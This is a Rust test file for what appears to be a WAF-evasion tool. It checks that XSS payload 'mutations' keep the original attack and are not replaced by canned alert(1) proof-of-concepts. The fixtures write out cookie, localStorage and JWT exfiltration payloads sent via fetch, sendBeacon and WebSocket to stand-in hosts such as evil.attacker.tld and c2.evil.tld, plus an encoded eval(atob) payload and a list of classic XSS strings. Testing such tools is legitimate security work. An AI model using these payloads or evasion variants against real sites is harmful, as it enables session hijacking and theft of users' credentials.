//! The XSS twin of `sql_mutation_preserves_attack`: a "mutation" of an
//! XSS payload must still BE that attack, not a canned `alert(1)`
//! proof-of-concept swapped in for it.
//!
//! The bug this pins: `xss::mutate` ignored the operator's payload
//! almost entirely — every strategy emitted a FIXED library
//! (`location=document.cookie`, `<ScRiPt>alert(1)</sCrIpT>`,
//! `<img src=x onerror=confirm(1)>`, the polyglots, …). So a real
//! session-token exfil
//! `<img src=x onerror=fetch('//evil/'+document.cookie)>` "mutated"
//! into `alert(1)` shapes that steal nothing. The de-rigged bench then
//! either scored the non-attack as a bypass or the operator shipped a
//! dud that exfiltrates nothing.
//!
//! Proving side: a payload carrying a concrete exfil/sink/remote keeps
//! that construct in EVERY variant. Adversarial twin: a generic
//! `alert(1)` / `alert(document.domain)` proof-of-concept STILL gets
//! the full canned arsenal (the gate must not lobotomise the dominant
//! legitimate case — that one really is "give me 200 WAF shapes of an
//! alert PoC").

use wafrift_grammar::grammar::xss;

/// Canned non-attacks the engine used to substitute wholesale. None of
/// these carry an operator-chosen exfil target, so none of them is a
/// valid "mutation" of a structured data-theft payload.
const CANNED_NON_ATTACKS: &[&str] = &[
    "location=document.cookie",
    "top.location=document.cookie",
    "document.location=document.cookie",
    "location.href=document.cookie",
    "document.title=document.cookie",
    "self.location=name",
    "window.name=document.cookie",
    "<ScRiPt>alert(1)</sCrIpT>",
    "<IMG SRC=x OnErRoR=alert(1)>",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "&#60;script&#62;alert(1)&#62;/script&#62;",
    "<script>eval(window.name)</script>",
    "'-alert(1)-'",
    "*/alert(1)/*",
];

#[test]
fn cookie_exfil_is_never_replaced_by_a_canned_poc() {
    let attack = "<img src=x onerror=\"fetch('//evil.attacker.tld/c?'+document.cookie)\">";
    let variants = xss::mutate(attack, 80);
    assert!(
        !variants.is_empty(),
        "engine produced zero variants for a real cookie-exfil XSS"
    );
    for v in &variants {
        let lc = v.payload.to_ascii_lowercase();
        assert!(
            !CANNED_NON_ATTACKS.contains(&v.payload.as_str()),
            "cookie-exfil attack was REPLACED by canned non-attack {:?} (rules {:?})",
            v.payload,
            v.rules_applied
        );
        // Every variant must still carry the attack's defining
        // construct: the operator's exfil host, the cookie read, or
        // the transport sink. A variant with none of these is a
        // different, weaker payload — not this attack.
        let still_the_attack = lc.contains("evil.attacker.tld")
            || lc.contains("document.cookie")
            || lc.contains("fetch(");
        assert!(
            still_the_attack,
            "variant {:?} (rules {:?}) no longer carries the cookie exfil",
            v.payload, v.rules_applied
        );
    }
}

#[test]
fn structured_sinks_keep_their_construct() {
    // Each: (attack, must-have-any). A real evasion preserves at least
    // one class-defining token; a canned swap carries none.
    let cases: &[(&str, &[&str])] = &[
        (
            "<svg onload=new WebSocket('wss://c2.evil.tld/'+localStorage.token)>",
            &["websocket", "c2.evil.tld", "localstorage"],
        ),
        (
            "<img src=x onerror=navigator.sendBeacon('//x.evil.tld',document.cookie)>",
            &["sendbeacon", "x.evil.tld", "document.cookie"],
        ),
        (
            "<script>eval(atob('ZmV0Y2goJy8vZXZpbC8nK2RvY3VtZW50LmNvb2tpZSk='))</script>",
            &["eval(atob", "atob("],
        ),
        (
            "\"><img src=x onerror=fetch('https://exfil.example/k',{method:'POST',body:document.cookie})>",
            &["exfil.example", "fetch(", "document.cookie"],
        ),
    ];
    for (attack, must_have_any) in cases {
        let variants = xss::mutate(attack, 64);
        assert!(!variants.is_empty(), "no variants for {attack:?}");
        for v in &variants {
            assert!(
                !CANNED_NON_ATTACKS.contains(&v.payload.as_str()),
                "{attack:?} was replaced by canned {:?}",
                v.payload
            );
            let lc = v.payload.to_ascii_lowercase();
            assert!(
                must_have_any.iter().any(|k| lc.contains(k)),
                "variant {:?} of {attack:?} lost its class construct (need one of {must_have_any:?})",
                v.payload
            );
        }
    }
}

#[test]
fn adversarial_twin_generic_poc_still_gets_full_canned_arsenal() {
    // The fix must NOT kill the dominant legitimate case: a generic
    // `alert(1)` / `alert(document.domain)` proof-of-concept is a
    // demonstrator, not a structured exfil — the canned tag/event /
    // polyglot / mutation-XSS arsenal IS the correct, semantically
    // equivalent product there.
    for poc in [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(document.domain)>",
        "<svg onload=alert(1)>",
    ] {
        let variants = xss::mutate(poc, 200);
        assert!(!variants.is_empty(), "no variants for generic PoC {poc:?}");
        let has_tag_swap = variants
            .iter()
            .any(|v| v.rules_applied.contains(&"tag_event_swap"));
        let has_polyglot = variants
            .iter()
            .any(|v| v.rules_applied.contains(&"polyglot"));
        let has_mxss = variants
            .iter()
            .any(|v| v.rules_applied.contains(&"mutation_xss"));
        let alt_tag = variants
            .iter()
            .any(|v| v.payload.contains("<svg") || v.payload.contains("<img"));
        assert!(
            has_tag_swap && has_polyglot && has_mxss && alt_tag,
            "generic PoC {poc:?} lost its legitimate canned arsenal \
             (tag_swap={has_tag_swap} polyglot={has_polyglot} mxss={has_mxss} alt_tag={alt_tag}) \
             — the gate is too aggressive"
        );
    }
}

#[test]
fn evade_path_preserves_exfil() {
    // Drive the same public path `wafrift evade` uses.
    use wafrift_grammar::grammar::{PayloadType, mutate_as};
    let attack = "<svg/onload=fetch('//drop.evil.tld/'+localStorage.getItem('jwt'))>";
    let out = mutate_as(attack, PayloadType::Xss, 80);
    assert!(!out.is_empty());
    for m in &out {
        assert!(
            !CANNED_NON_ATTACKS.contains(&m.payload.as_str()),
            "evade-path replaced jwt exfil with canned {:?}",
            m.payload
        );
        let lc = m.payload.to_ascii_lowercase();
        assert!(
            lc.contains("drop.evil.tld")
                || lc.contains("localstorage")
                || lc.contains("fetch("),
            "evade-path variant {:?} lost the jwt exfil",
            m.payload
        );
    }
}

#[test]
fn structured_still_produces_multiple_real_evasions() {
    // The fix must not just filter down to one survivor — re-templating
    // the operator's JS into the tag/event arsenal must yield a real
    // spread of WAF shapes that all still carry the attack.
    let attack = "<img src=x onerror=fetch('//evil.tld/'+document.cookie)>";
    let variants = xss::mutate(attack, 80);
    let distinct: std::collections::HashSet<_> = variants.iter().map(|v| &v.payload).collect();
    assert!(
        distinct.len() >= 6,
        "structured attack collapsed to {} distinct variants — re-templating is not producing a real evasion spread",
        distinct.len()
    );
    // and a different element than the original must appear (proves a
    // genuine tag/event swap around the real JS, not just echo).
    assert!(
        variants
            .iter()
            .any(|v| v.payload.contains("<svg") || v.payload.contains("onload=") || v.payload.starts_with("javascript:")),
        "no alternative-element evasion carrying the real exfil was produced"
    );
}
